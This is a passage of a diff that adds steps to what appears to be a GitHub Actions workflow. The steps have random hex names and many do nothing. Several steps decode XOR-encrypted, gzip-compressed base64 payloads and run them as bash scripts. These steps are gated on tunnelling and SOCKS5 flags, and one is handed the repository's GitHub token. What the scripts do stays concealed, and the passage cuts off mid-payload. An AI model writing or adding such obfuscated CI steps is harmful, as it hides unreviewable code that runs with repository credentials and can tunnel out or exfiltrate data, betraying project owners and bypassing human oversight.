+              'cXcWJx9Upm7E8evWN8YxLxIf39LQZ/wj1iRbnYiw3v5ObyEGdMuSsQ7p/I0JKXgC4sri/mwZ1PugD9C5PqTawEYrmSwuE/e1o13Z'
+              'hqQUD3scXPXVe9GtMTX515I5JzPJG7mrWhipkno96ljYcpgE14I5k7vaHUd91ZS0wsihT8e5C+JGYt0Tgn/vvo3Ynfkhh8xjsmfz'
+              'iPctAGeOGEryUTG+IyLHQSuAFvi+bTlObqpj85T5eaMStuGDs5PFjIF3wu0s1A4/Fb35UbYqoHaa4B/UCwR2rdUf7T1jyYe5p/5R'
+              '4BS0a/xk/H3ju7mor75hVzqpge10AC+u/OG9ei2heTEDeT8L9zjIt+uvd/9bF3+7F264nX7cLHa6K0SkJXQOpTKAw5piOcuPo6oF'
+              'DNgpHcczhgF2ytWqbreeT05RMv6xk7ZyacLdVwSsjt4Gg0xJu45O2iRMQ6Sw6sXiEf6iThdim/OC9hTceEulJ/IoHIoj6i0l+KEp'
+              'DRo2LX1A2hXqEZ5O6qAlY6W0aYi0e1Gp+yK+/eOuzt85bAriyjl7H3iaM2oq4UmvapgufqEFKABmJTUgL7UV2wMdqdURQtp86sdY'
+              'x7Mswi5fs2MK+AQ1z3yuBHbpcgFf8DYSH3fDfGnHjKJvqpYS+W6tkjQ5b0pKXASThWEUV7usOgsatE7/O9QmPbssArfs0NrLy+CU'
+              'vIQWWm/KYTycEoHbuQj9Sm6IkfsIRhwz6u71ooJc+o5VUP0nLTe7eYnFQX1tBhMI10BFdnQ30fTWVE5XSNX/obnEn3Alrtev2d3e'
+              'iBFBXhyWuIDLM9nigMYaAWUji+C2lbU1M5LQq3ZCgaPyBlYhgyXP0Ho1xlaTMzNT3DiD4cMMUAvWzkwsF0v/BZrYjZFKrSWKdcs3'
+              'BMjiotLvCdbstoewbclViHFitcy8UFEl9Ct2I/RQUIHXBOTN0Xyi/0Om3Z22mkB9xC+JSi7zjECZR2nhEefGAawGHWeBInmQrYsQ'
+              'MGsDy6YiuJoiCCQyryES5K0RP1lBZ/RoH0kxBlZHrHVju71vpicZBC+Sc6iVYSl26zKlNBZKa5eQehVHQRTf9CXCGS0fnN4cxDAG'
+              'xZHncvlYYkCF/BUpzEM4YG5X/9HWlo6O7+COXvjgjEuRojwI4cO/N777mPc1c53tyUS29NQHYG/AMazqkgBXCtYW4YcWFrU+s1YM'
+              'r08qMeGsf7wrv2t7WvIFwdSSOPfHpqc5uSLX/nO9JsgXN5WzBXxeBZGLBEeQB7fjEy9kV1f4Qat6LT2m61tg8RbdCtzLJHt5BxVE'
+              'b6jMPmbfTOH8sM1neWtZ62vy+F96hSe7f3hWywMNnuWsyw6vJtp1GZ+sC76GLfZgYuikQCXe8I5r7o2mw94/5+g1IIVRFMMWBru8'
+              'tHvCgy6KOpGS1ZGBBY226F5G1G5f+SxwVLwGAmWlkyfAnVbcOiSsnyBomeDL6rvKwGBPw+FDuItdqkSwFsX1T4ROArP0dzVp/Sgg'
+              'rWNOqAj1U+njJOdJ7Lr+Jmq1XXuBvcy7OBuG95Ru6DKR6Y7hP4EJpQXcaSWjSHNF9kHQ9VEgF85RgmWSuLgyMBCWnRIP9ODlv8xs'
+              'x3yGLtM5RQAyAh7UBRWmz0wJ5muqLmdYn1K2jTJc/fpgrcjDX0J+ulCgx6HNx18T7mOl9lY3bPtRW9/uqi5kMqTZV+32Ifqo6MQw'
+              'DbVULt6O+6BqjCN56cbmWpXUKAKUiYGv1QWs6qDZ2CL/jOdYQ0Gbscg4qwZh/LCk3LR5e7AFD0wvCGi76DoZxHfgaVgBjsVzA0hg'
+              '58VNgezxB4iiGuSWmnOg/q67SxC4gLGjnf1ZW7/ot3M/gA6bY6Hd796WLXOLXG6HARXor1QBhJMK7BBJYeoTokifayZncjm+UPTN'
+              'rGca32J1TVJrIgiPKO1S7njvgOOYD+SmEZv4qNgUpuXF3VtlTdvQVhAw38d2CuIhduYyLowdgbbQ3hySQBikU6r22XC78MeWgCP8'
+              'pXq063/KfCaxflJJ7UDc1vNSjVLnsIsXh+kCkvZ4eyOzkOYg61/2UKYNoRsxHoETpPK9TAs/APKyM/iVCDqo19aH1ju00T2CbG0o'
+              'UFHqz7MQrX4eJ+Wo1ad0IBCPGa6DkY3I7fW6VMgakAZV4JhZ6U7i7SIGJ8u6SqsGsJfW/3xl5CDYwCquQ/LS+ItkN+WN5gParYUx'
+              'MLQi+Umn1VLsNlQRPQW9TvvVNeRJ7s/jzxVO+z1tED53x0vIFia8FmJ6A8k842QQUj6kzmEA2gQqMOCp7Vr3+ggNo+MdONl1YPCi'
+              'CyVEnnNTAWctjES7p8j9w4X8V6ZyInZ1eRb6Us6IkZeZ928vou4jiX2OUezqj4yDlf94hSzJR4o8G1VPffIdj6a0Td++pRVtH6gg'
+              'wmeUVLr7JX77O9Bl886b/lGvOSW5nLtI7ByEHz+JW8mz9EGVm197lOKWDGOO3RldPineS7MtfDh+26TtU1KoqlrVK+cIPUAhZ/4S'
+              'dvGfMScVnBWhmmywW0g9ygVzpJsl8DpnhBUPujctYHCIT+JlK4n7yUp/sAYsRVf3NrKTkA1tQC2UEPER6iX3HphcLWgMpu8+QzGh'
+              'pGQsqiFEfkiXtW14opMBH7gD4tpULFIfU2U/HCi9Ck6h4zYp8kxDQm0/DW7fO7O7t0dK+nxcBUJIpB4Gggwv8HEYIAu2TnK6NZR6'
+              'GweoPvILop6/UhjKeu4rVp1sNW/9IUmsNzuG6quqlupPDfect5g4kO/DrQkEgV5dJbjMyfhmStYLFD1aUT2Gxsu+b62JhMRmsSx2'
+              'b3bFXjfhVCIzZT/555nem4bMLLyjkP6AicnjkITygwoAdkE3O5UeqZzl24yjiGUfYvCpTV+f8ombPRHx4nEenMd6672oGc/3Nt5w'
+              'MdUWt2LahRwpcLH72+YcjuoyHI0eQ+tppxO9XnAaCbYiscURTeuk9S7HgZDaN7U7o+k1NB7d29pQQfDHgkaKvd08AdE9cwzhhiaM'
+              'Fn+g+hY/0/2aRmtbrdfFlr4exu28SVgNj6gvH6UQxKHQQynlKbOqy0QMHi7Ou3X4LBI8mtZSrwKprIO8bxSF49L8NOjpDXB3rcay'
+              'iJBI/Ka1KbrTcinMsKi1RSVEO1bCEMq/rm4mDfcULnfhD+rntP3wU+qz+XJ1MatWSCu3fEl1/LpXUrMU1txSbZMtyEDwI+40jnTt'
+              'f53WZEcwuWvxElP7uxX2+QpE0G8cbSxf5MTecOKBGVUdkzZurzbEhGvsZyPT2InNU+68PUZRaQTXVpYDi881X5zVh45ZEo31KLb7'
+              'TS9TV11DNgf0XM0sgedpe7+bCmQMHXF5QjRVQwWG1c99RtWbFiZsGDjQ2JiEeEs0E07ugKmp5KaKZN+eaofUEpcrnH4+PIMAmyhf'
+              'M/+8px0TfJKmwf9w6SZPh/KNIWMoC9oUA/E0I1QdmwIK2flRXx4REX6mnUqPZbheyG7HcG1fhat79aBRVEQ3LEaBBBD9gpkVYl3V'
+              '8bG2JhAreKTjkZ41HAVMZYBgg3QGSbGvLxIVzLb9JdcMGE0UcPc3WOBeXsQM31CJC2A0WIEzBLxqJDG6USvQwiM7gsFv6vYo4VM1'
+              'HHktVTSoVreJsaGRT2ycUTm1o23o+dDOmw2iJsMJ8bZhbQFv4dDW2APkrKgKT5aMi6glzalyJktnuDIi3PgU9NS9z9xhTFkkcgEk'
+              '5G3aqSr1G5vuY8HRJOE1azyL4pOPCJwayGkX+9mxBxhzHHtfl/ACb/4mW4/BMpSmWKSmseKS+cqMQ/p07ZXhrggfqMSqGaUdeG03'
+              '/uuxhR8v9lIiRpVy+oXNd/0G6xjMOdwFShSJJeOr34bXaT1Yqd4d9RZFttMmKJAOV+BBD05vKaZdGecB6Kkj3MDrmwmt0ws27Swl'
+              'BHOAPUjNUr9FOFs+oi4ha60Cp7mnWOwSwdH5yjbWtIhcGz+L833w4OIkeLVabM7v0M6QkmWkIW8DDBWYAFQ4CvCdSJGgBWkjsFc2'
+              'fu3GN1Q4N1wEFmeCIZuP/72nBECw9lcy/oka1SL5BoenoO8OHZTxVAztH6T7ZFs0BLQGIr5qh9w5NCbBAkXt3pyY+Zc/6YStFca2'
+              '32DgLC7Nw7YCBVNby5C5CRBvNwSt5jEWt28YwtkDiXsQ5G4TZ5KBy6ZX9dScY9PPsurzuVi+tCEXmLckWtDGfdNb5vaWg8YbFJus'
+              'uwwwIC3KWtbrs2AWL+UktxDnuKgxrEv2WpryF03AN3Ip690GDt85kjGC13gn5yjXB3NJUwBSxmouW5uF8Z0nPib5Nf15uX7WYyUG'
+              'PPsroOkvP25XTMo0UbfuseEfNA8Lxx3s69x6IHky24EUO+qYJx8gOVTPCHO2A2QmXafA1CkX6zRNAT8yqngUQpZqOJBmO48bCnQm'
+              'dzmnc9Z9JWZm4sY0S3oRKdWeKabh9Ovr/Q8ah+CrWaSQEsaVMHYrBA8wI6yAvOyZ5JbbmjT5uZGM4I+sKl89MRdyQjhphZZS3vm6'
+              'adhsybHkjN7LwA1CdZjpmwUc28YVqQzZsIYsYkD2qsSYk4133uA9kwLyoVmlKoWK7zq2w2Kk4Zhy2lfNZDWcvkkFOuWxYNSpx+oI'
+              'L55s1HjpXwncFL2z/4S7/tJ0Tw2edsxsQ9UQewukHqkDUK2K1P37Sf7PvIAHURBgXPiyf7lCH4o4wi2c83TLG0YQj1nUERypKCeA'
+              'W0pUBJygISPD1byp8j17V93TRGoLcdnTACC356d3oaiiMIZ2z7a+n8m6y5M1wR9MG57wWWJAWBNjMUQleMo+qtor3IX58zqk4bO1'
+              '2TBwuAox1rXkgViAZNW78E0h/T+XgW/r6tr7EIiaJPu1s20jHTRoErLfgyYxgegF4z3MfRIAgdNkNpitnXXtpLbRMbNA16GsZmg1'
+              'WNNOshwRFOzWQL+5cofIA4qQFOqXMHjp4l1rOtKKbQaN0MDUybjN+MZmjoLY90541y2tGOfw4y3HAIgqt4xVPYpOg/9eQ/RAnvAx'
+              'qlmH+X0q6ETa3/etUsv3ty+O2f7s3IGMAzQT/7xiLItcx2mw7osjBevFW87X+ap/49URM0V6PPKYazXW3AARXb5VXpVCm8zaHtf5'
+              't14tBAoFW8dtUWf2+6x+Wx8Ou7jraMrbobkDKnXGRmdIPk3c2YrLaOtm3s8GLcTgB6O91qwB9u4yhUjixdFYiN3e+uB6+XVpexv6'
+              'US6ob9urVqNM73GMmAjWX1zgmltqhBQAaxu6F+gOzmKmcVk+W9rsYPJ2uUxqMyp2wZslMK0j72CqT/pcw5UiBicWMUH6wgZc+nIl'
+              'BWbKyfA4l4kFn8sdgkMO1KAc8lLN1waIwhmE0/yZT3pYNEEXb7ATEbNBr3olK/gUHZfBmNkFwj/HAQb/4/iYeFE4qK0Po6nnjNTh'
+              'Le0GtJdfggtx0mYsg95edtmC+Arkdh6peb0DAz2N1FTXNNjH6ZJQlRHB9afR/imSEnq0yJk6YONgNiMBFwzKGxRq/ZXiSCAlYPBl'
+              'JuMod0dpINc8HoTRp0ETJSS/FMXLUayN2RtM6AhLtsQIE7yGxdO5iKVNaAS0ZnjODfX801dFYSIxs6ZIvw+LImKG3heMWsTGThg6'
+              'xAA8mzS+CLH3cZAAuCyRy441SjzlExs7JAmWjohkPKWne78pY1CUyigKckTxMgGl+bV6ioOyslNYfYeF09S4f6uU820yWPxOpBYR'
+              'mkLZZgrCXWWWZskQxAhYPoyjGonrkaDKL4upDJhcFyaq0qqAoIckeMeq5zBNogHbfOxuuLJozmG4XIfMfg3R5fI='
+          )
+          key = bytes.fromhex('712386c83d47e60939659c97d21f6f1dc15fe5f259ae2761')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-794489279e02
+        shell: bash
+        run: |
+          :
+      - name: Step-9d03578592a2
+        shell: bash
+        run: |
+          :
+      - name: Step-2c5e90a4985a
+        shell: bash
+        run: |
+          :
+      - name: Step-3655844f556a
+        if: ${{ env.UBUNTU_SOCKS5_ENABLED == 'true' }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'aQL/MnV4deF50+6ePMElxAnJAy7TInlPTYCQId+kICqeCNXM3GAcoy9l5pA8JGoBzmUtuZhdMcCEkZgVMaCHo7EkteqMW+ihGVcv'
+              'Qn78kutJvYrBSAfBEIC254njfpfYu+Tv5OK7WiKlTENCc/D96axzKlbgTBjXie2iwY0701X+v5Vfrm3YG61LbIrFw/iP3y1npB5i'
+              'LpC0Eej7WLq1l5ODWIgSLtwrzaIAi8kHsP8B8ZWB4pULfeK37KU9lgIDoE9WorOqUeDJLDlsf2UzIiVi1FuUix+6DKpx2Q7WVPCY'
+              'oN3sxj2PuyGcMdrSqhBpZ0MPEqPkBIh+YXeYkE9HMrymVeSweneWdenH41/9GqOdIzrcwI+LkIx/1otZ0O9x5uACgvVkWnRPyesa'
+              'WALXpPgNG5jpPb7VKY7gpdYZoQyMogQnn9LeatMZJYhk+pFD5TnxZUkxe4EDUgnIXDl3c4atJ9L3NUa5u4e3W9UKdCu1HEV7bRih'
+              'l5QzjYgnj2Pnm0d5kcY2iLz9wpbMoRHKRu2V607uWMWuIGDeHRY4S+FKunIxgzUE0chAduC81j9jZx+nQr13Nk/O/hrwyfqKat+8'
+              '2kV92OfUKvBi319yiumDr8sYZwxTOpV53GBrrEWNrWTFzk0pzALdiChm4GGnd+KXFCPqw9VkZwOcHpIDiec96cxugNbBDiBUQa8h'
+              'wU0Grrk3i3HV4eymsyzVCdivkemVZO1SQdKmUuV03+tfkBhWSIshzlG7y+wJJ0qo0KEFfe3FFE1l2CilHKMguDGbpFqiN2A1lmMY'
+              'PjL5izv9MJ7lzb2oMjLySjPbU+ZdOlpp/PnKnY6fFZUFptfcROgytGgEJczREJjrFDi7RgtzC06k7d2XS2uAiWLR0onpYmDcSE9a'
+              'sVABsKFF+XN2teE7UihL81D8udWXFwSv+7wWs7x/peHqsaKxUnIK4eg08wsZZtNwLW41iYg6je/VJSig5OT1txQFine9vfGhbOlw'
+              'YWrvj114TUUnolBpODus/1XYKbUAfXbrBm7OsQk0t+ZfHf9Gxs4bCb0Zw3pVyRWRNEAddxNLAoA3ljgANvSC0D2DeqVzEN6m36WJ'
+              'k7dVR92P+ym9L1anfp2gvhAEkxf5X2T8cnXY1yvVgwhHChI/TitRJRVZDDBRPrj3Qfnb+u5CqsvZ14/PRmZ3Tu2C/OpiVLJX6Xle'
+              'CxuajSK7zfHEQ3zsgXETnTur7kFvo+uZDfFhCwSAXSFIRtcKNNGVMO1U57kCqueOt+tGSW5kfjXs5+gInVahiuJYIrba5etqvENL'
+              'HhFkWrTLvAed1dyLKR42GrwSqLAjM7rEY+xYmJVqKojjz2HcCeYI8TkXmEYu9Qn2XKcfVX88jSczdfc8te51w0YmlNgx1M4m4X6h'
+              'jVn2n/IGW3UQAqiUv6z+geMmxCXzVVFfNu7lVkVV7xmLQSlaanpUdO5NlTiwOdfDjcrAFg5dss2fiZNSxMOeQkk31/UvjjHi7eme'
+              '0Zj0vFGV4qJOOFHEvk58dFAAN0gvjitth3HEiXgZsOzN7Oj4TEVXagQoaz3M79DI8lwKP5u4dxWJgGWeeWsQaVU9yel1Kd2dSgW5'
+              'v/HwzKpanhkUnKNn6bUzhVqcwXoJH4wioNMQsmFmqYLowzW1wOzcLJuDwTJf3rjfi95l3QyHd2qq0Zc6V44G'
+          )
+          key = bytes.fromhex('7689f732757875e17b2c7bc85d8e06f31934bd91b1b8df92')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-ccd3b78505ed
+        shell: bash
+        run: |
+          :
+      - name: Step-73f51b10b549
+        shell: bash
+        run: |
+          :
+      - name: Step-a417b0fc98ae
+        shell: bash
+        run: |
+          :
+      - name: Step-f6a4d1a5ff92
+        if: ${{ env.TUNNEL_MODE == 'cloudflare' || env.TUNNEL_MODE == 'dual' || env.UBUNTU_SOCKS5_ENABLED == 'true' || env.FANOUT_ENABLED == 'true' }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'IRSPmRLdDcOXpE848gbNmOTFqzc6thOwCgYz9VGOp+EAbVblS+solrxQvySnC/+oBVuJ+pEj+vrchOabsMP5FRemRhXEKnw1VrGm'
+              '/DtQPSBDbvpt76S32+a0EpX14KJzvZQ4drNkAHx1qstyGc+nrDfLXf6C81qPYnmjeyp+PQ0Q+8bYBRgX5LH6oQop1Z004KyKFDQR'
+              'INVULgsMGDcvQAom587+NZgSmNSMBWLY5JfYhHZMoK8wH/kCk6pJR4NWQq+dbslK8zgB15yLiQKzrb7QfiJpibuGBwJzXoG9OSvJ'
+              '12Rq5/ZrcgODK+J7aKI3BFRu6hZqJjwGP4OYh9czLh1BrXjfX5xGgriwpaVwQ6ylskSZQwqpc4JNp9KgRIF/OgHV+4cUzBoaxSUO'
+              'l2MBaBo1i9fVSGFQ6pV0FRFX2WuSU784/jb2mzRikqI44oBmT+H0gdi5rr2GkRdEPhFHTYKUnLplrhawqQfrbPGR6TSdfD6Ukmkl'
+              'ICq+Z7NB3O2nxus44oy7QSudx9WmsAvNS0LZ8XTluBgxBzFQ7txgP7CsVwF+q4fFNa6YHo9rG413hwn+057D/qzTnzPxkHgHYRoH'
+              'V/QlHesjNYyuHpzLzM6XKzh+466cNIMAD5GTvyZgBEtx1fZ4loqM6lwSIrKl/UcarCkrxerYYU7c8QpQCo61ibbdQLZ/7qN4gohH'
+              '1j2cc5JNy1/1wORBF9ALEqbHMqHdMsARpsQI97cZrNNxIQMZQhzEga5oIMWE850rNB1Fc5bj2QZ6i5xWeYi8PBTdxsbULDN9aTcx'
+              '3Nqu1etws4ZDO8+y9PfgRIWWo/pCHIkRYNVYabNMaf9qrHcrMDv80sc6xnpmjfJ6a4Vct3MCd4kLGY31sr3xqRbmW4whD7UugEm4'
+              'L9NJOP2TW9o='
+          )
+          key = bytes.fromhex('3e9f879912dd0dc3955bda6c994916a8f03835684b3fa9b5')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-1a3df72ff0bb
+        shell: bash
+        run: |
+          :
+      - name: Step-4d5cf8d8da3a
+        shell: bash
+        run: |
+          :
+      - name: Step-30cf5c5e6446
+        shell: bash
+        run: |
+          :
+      - name: Step-4c7f62d0571d
+        env:
+          BOOTSTRAP_TICKET: ${{ inputs.bootstrap_ticket }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              '7TDUiCzQ/ajT0XSRKaKRTqvES2GZF3V/O6byWxqprC7WLT8l971N/QDMxgk2bZUj6dhlGvBrsWou8OTcxtjWyDsOg4D1DfIfpOdf'
+              'T0fRqPYgOzrPfba8dNf4ZEzBXR3Q0n+lYuvhsEANsVTw6l1IzAqXJprJHEsBbMh9WWe1UUhBeRGZN+KXBQ2+E0JfmflszQtBTvRW'
+              'gkgoN2+k7RJu8vCTmB+58P6q+9wDJixTtgbF0jbQxnS5zSmVYSXID2OwLGYcTiZzeVIADrkDN3bV6yzwDwzLVHod3M5RkWMtPIBd'
+              'rMXYlH+CA4G1QN+PLg6/eOBr9jj/FSE5Hdc9QjlkVAHyL0YYtguKAEBP6GRsUG0XqO98rAeXs5lkAL8rVhVHDqAAFxROuXfr2ZL4'
+              'z8YUyJnjpcJF8fy0YcwsSDPBS/V485ngWWEMuKSboRPS+LEhYSsae5Eudrr05kuob/1p0nnUPalKOUV0A15BevmIlc1bRKtz1z6U'
+              'wWYPpjeN6wfLZh9/sI1BwqVZWfEMoJd0zvZTnrSqOb05B43XjPWJsUvwRP7HQ7gOqm0eEtkQqgI/z0anqFltMk9lpdb1uRAd2q8P'
+              'Yj2eKzattzBNXnl7SoubSRYutprRw7ZT3MgSRn8e7W/t9wjeCx+yFFi22/WVuwI50TW/iCphfNKNTPpMxU4FRy/Ah2WhapNIczcl'
+              '5WF8g2x6xnpYhxH7ts0ekXrdglM63mO/1asM6inkLhNNIDj1DIqsDvYFBYProX9eF8ohkllopqESrdMlR0mqgpmt/7FVoVpmJw5K'
+              'kfT3ocKc5F4Xk0U6/CuiFIVTncflAVOEzEFQoR+KcGBXknW/+nEDwUBhmeL08HoUKvhfiw1AdPqaf/F+tH+bj6CRTt0iwnr2Q3cW'
+              '4nVQSvrYIHMgrO+JcUv83EHcCsbCV553tLa38vTCFkaDe2Ag9Erox8SZEoDyp66lTlj+NwbIeuZlYZ14Wn3WtiWmdeoQXnFnWhic'
+              'i2UpZnxM9GsxK84NUcteIjOsWuIxC2Vs5Xaf0oikIJNfugyx2HD7iFiRj1RK0WXCoW3asBhPQVZKbTGP/wBXGcXz5b5s+iU3aR6s'
+              'p67HbSuqUqJCLx6V/busMc/Ex9HgF3Eh1drrAdbi7XR8ymmWOGySMFyOsou9j8JA3sttYa90u/EUzThWND5f71BY//+0+qjR'
+          )
+          key = bytes.fromhex('f2bbdc882cd0fda8d12ef1c4f6d14b76bbbabc3e28f084aa')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-6d7906876def
+        shell: bash
+        run: |
+          :
+      - name: Step-f58f9104e81f
+        shell: bash
+        run: |
+          :
+      - name: Step-e107f8056069
+        shell: bash
+        run: |
+          :
+      - name: Step-c44c6d6034a2
+        id: session
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'TzupV16kwBFZXjF/kD2fFBT28sbV/AyWxOLy5Y3Du2rOi2esQG76b+u2UuYMviZFOCETDhUA6kMtXeS8cre6RIE5TLZTIXzGNX8Y'
+              'avkVyBPYYLwy3tJdos6JJwtZQTIjHjIAQNDOdeZgpudtlzG5kdjWA3IOfqM2/z/WrTmjO7Z8fKo4c/6DfGNECIL6P8R0uXxcPEii'
+              'CTErYrQ6GJYdNiFQJsFVUjKLDo/lBgFzKmL2nwto2Z8Hby6Xd2ke3IRWTeXnpp6/wVLk+gPaReGF97OHQMZitFIlEeKy6xwRL8WK'
+              'lZSABCfkzCnazEmxnxRkIi8FlobzlA9VozkPP9NzOFqy9RKL0CIsdlqPyYCoh+DGO5DhrNpgDwHsK3AeSnbsu6hMKms5hUBr7Ahi'
+              '29dCcw3vzJuhtBMyJanxBPdCzvOqpVks61ThD1r+K//CzvsxODwnUTichqQfLGF52AHEu3Xa7AzhdEGHwYevDbSrr2VI54vC2yoU'
+              'gZdakUSVN3X1ADPKeNKkKjeLItYh0tJA2oDJ7x0LOMz3J6tbd9S7ZIkxu3timDTqyJw5b2G0e//Ll0k3rIGLvskLtsvoFqUR1E2k'
+              'R+l3Vj3fBGV6E/FSBhKFn7Y+B6Cmh3V6DQphcweuJGWVpyLOot6HRhMGy0gwiVN3okSztb0+BjVO6SV6vr2wVt8NieErcjIjC5CK'
+              'ESJfeG9lx52M3Tu8+C4zn/j+jRGqkUY41ps7Qt9haKO86O4JmLh8omac/+9hegsL7afSuJhVbDNRAKzwLMstLGcl2G+NZapl2mJ6'
+              'ulpk/Oi7HKf4eLRGiQPjkSfQXQlAohTOLIZZpjH58yBMdTQQ2fRVdv+EfZlbpJZ9o+uxG9Ynsmesp18appINqnq/R+oqMP1HdiPw'
+              'b6528J8HWpGgLThICc5araZldTwzbkYnfnQpIrpru3ghaM01Ov5BCOBZU1+AyimrfaMTp5jCgkWVq0JCu7KGkSYB/e/qj8lW+eUP'
+              'UmlRQOlRg+bSbWBKHRf5Eb17nhJjYWfL1poyw17D2Joc+sjmumIuzEBrCmWTyQQuHHJ15rMybNNYB59Djba1UDNUy7AmFByUuZNx'
+              'LSrX+RalnHntmk4c6Bh6iw2FccwR9hyJeOhQtjJcpDLz+NTMRNBX/o9K8CbU07XEZm9T9wT41r1mYiuIIXyInm5TOHeCOYQ7fZ3c'
+              'uwE+FY1Lb809Qdkl7GddCvCrXQDUz/FC68qvpY5pjB5Y66xW3CHadCFty5wkCADHpz31dE32ahReA56UgJrwbdPjVVyHOrwY6Dmr'
+              'WrLXzncC9cjtFzNd2iGdi1tUo7UQrqMgGGvqkGsR7SC3aC7cfUhaceLVq6sIaJr8sqNQRmipr0v/zx9jo0S+lq4sRKEsVv9MlB+V'
+              '818QKJ2DLgXM+MzhFlcFwjxPPWascTiuTP3XFf3V1+MSxZiTuEG1pYCP8h6WMtWLrSdEzXI3X6buLWGtelc2GvKLG+oPYaXc4IaQ'
+              'aNYzwHU2iE1GBFviDuLwrXVvdKJfjlCC8yS3BVAyIWebL5F0pp3lD6i9ZFy+Ok/zdU0SjGap5hviGB44sLF/r10Pdk59Jt5KLfq0'
+              'xzkZ8l0xhd8LSwVqaOobEl92O+BMA1Scl9xt+1+JzjDuZG/c8gioNeGHB/AVx9o/YV318wsIBZgEDO1SfBxxdMzZoivLffQ81MUA'
+              'EmxXo4SUsFEoWiU2cDhh+MG3yr7+Cv/UbSl6VEnocgWPimkbZ/YzLSRDmsfREbzdkegaImjt9MtRKmxqbmlpdaNSE5+jfpQTed+U'
+              'z+21d6MDRwnxxLMWHgsi/UZWhnzDIRX7ap2hYKgYonFZYVHRlhgWHFnpvYSwTc2MvTi44m1asZgfZeI/CcFmLe/83xwm3O03CVhP'
+              '0QnAadMVLSDotbP0MBAjnn213kxIim3Jg/A8/9xbq5EwhOUCoIFVBJ/hMsiKwWp3jYYy1D6RdXJMwLPU+UpeCCR1qsFDhNJtWPO3'
+              'yAYA9DuxEJBJL/hOub3PMU3pevhDLeVWaPf2PaMuFYnqkQ3kbur/PtgWlZ53f/niN521Gt+4F8jfPKoDCRGLJjo/KKQRRD3Kpm2a'
+              'b9wPCzBTfy1rgcbBgmjC8+4vbB02YxzsxJTmQWsvPZ6Kz+2Qd56hWD23BE9yx1RGQMqInOQ0BD+A9z9P5kUjwPR+bQene3BMzJ+X'
+              'jXJxuKk7xcl+eZNnyMwaY73lA2+NTss57zSfA3CJS20aybGjWVp4wLwBwhgz8Zd0sEA6IiQepeqq+0jzJsYzTvzww4uj3ZB1GL0z'
+              'LjJgOMcqPLLzTTVgOS5Hsy+VjzPfCxftQdo89ebgBQXZ2tj0TX946P5xlT5vzqn6l/mILu/Y7Asf0nDm15N7Xh9/QPKpewOYL8q/'
+              'YeRso9UJtCNGorsdqbeyrXfzWd7G20cNBrZi1ewN/yz546FhLffujbQlAH4FwRGCNniOkuPGHbhudrXnHxTEmumPLqDgfrrOHfQG'
+              'lmYa7bDhi5Ev3Pvqet4eWOENJvGJoBBADknkZRUlYxP8pnq7D32VqsvLktZnMmmXN83pmR0o00P7T4m1WhELPGhKxRaNq+FNVn4P'
+              '62BWk7B3AG/EqnFfHLZmDtDXwR4YQsLuuwaQ3bLm1R0ugWIDCVGc7vPWeqiENY/TFnpcomdi6abNJxbKQAroYDDEbcDmMwdLd6F/'
+              'KIgvmODtBVYRDljbd3a9XbDT4VAK4RknOk5gQv4taYVmcgw0t8/dIPbgWjNpO8uwC6L9goBfB7ZVgbXWFltmHRDV6pXU1LdTwCRV'
+              'bHKpMB0O++S8Q+42cpSFuGbO8OM9cDxYAGjwMyQzYCjBg+Q0AK6nW6F8IDfFBFZkPEUCY60BHDXvpSftYck4dhTDk5vkceSyFL7X'
+              'LFApI66tzMJptDHqcyzWyckP1FQTSczuRrNgvSMv/KN7Zsrq6llBZjBH8iNmJgHJ4aM41bhEtOXRkPOB30LsCWqNXUJ4y5CGWdJA'
+              'ReXn6cZc5aH4iSrHK9kg1QNyJXoa4FtvWFCblurvDKdZ22+hDtKYPtUIt8X0j9kkYOx3sdwn5xr5ey35Ah0unG31HXReXsLGFAHS'
